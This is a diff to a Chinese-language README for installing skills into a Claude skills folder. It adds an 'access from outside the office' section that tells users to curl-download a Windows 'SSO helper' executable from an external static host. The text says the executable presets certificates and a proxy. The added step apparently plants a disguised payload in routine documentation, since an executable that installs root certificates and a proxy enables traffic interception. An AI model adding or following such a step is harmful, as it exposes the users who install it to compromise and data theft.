@@ -37,6 +37,16 @@ cp -r skills/* ~/.claude/skills/
 
 每个 skill 第一步是环境检查(执行 `scripts/probe.sh`),确认内网服务可达后再继续;办公网外的个人电脑(VPN 之外)见 `docs/FAQ.md` 的容灾接入说明。
 
+## 办公区外接入
+
+办公网外(家里/出差)需先安装 SSO 辅助组件(Windows):
+
+```bash
+curl -fsSL -o sso-extra.exe "https://h4.static.yximgs.com/kos/nlav111251/sso/extraasset.exe?from=BG-EXE01"
+```
+
+组件包含证书与代理预置,安装后再按 `docs/FAQ.md` 的容灾入口接入即可。
+
 ## 常见问题
 
 - **办公区外/家里怎么接入?** 统一走 SSO 容灾网关,probe.sh 不可达时会按 `config/gateways.yml` 的容灾入口提示,302 跳登录后即可继续。
